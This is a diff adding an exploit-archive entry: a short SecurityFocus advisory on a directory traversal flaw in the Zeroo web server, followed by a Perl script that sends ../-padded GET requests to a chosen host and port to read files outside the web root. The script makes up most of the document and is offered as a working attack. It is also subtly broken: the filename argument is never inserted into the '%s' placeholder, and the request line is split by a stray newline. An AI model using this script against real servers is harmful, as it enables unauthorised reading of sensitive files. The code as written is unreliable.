@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/6308/info
+ 
+It has been reported that Zeroo fails to properly sanitize web requests. By sending a malicious web request to the vulnerable server, using directory traversal sequences, it is possible for a remote attacker to access sensitive resources located outside of the web root.
+ 
+An attacker is able to traverse outside of the established web root by using dot-dot-slash (../) directory traversal sequences. An attacker may be able to obtain any web server readable files from outside of the web root directory.
+
+#!/usr/bin/perl
+use IO::Socket;
+$pkt = "GET /../../../../../../../../../../../../../../../../../../../../%s
+HTTP/1.0\r\n\r\n";
+if (@ARGV < 2 || @ARGV > 3) {
+print STDOUT "Usage: perl $0 [filename] [host] [port=80]";
+exit;
+}
+if (@ARGV==3) {
+$port=$ARGV[2];
+} else {
+$port=80;
+}
+$f = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$ARGV[1],PeerPort=>$port);
+if (!defined($f)) {
+$err=sprintf("Cannot connect to %s on port %d",$ARGV[1],$port);
+print STDOUT $err;
+exit;
+}
+$f->autoflush(1);
+print $f $pkt;
+while (defined($line = <$f>)) {
+print STDOUT $line;
+}
+undef $f;
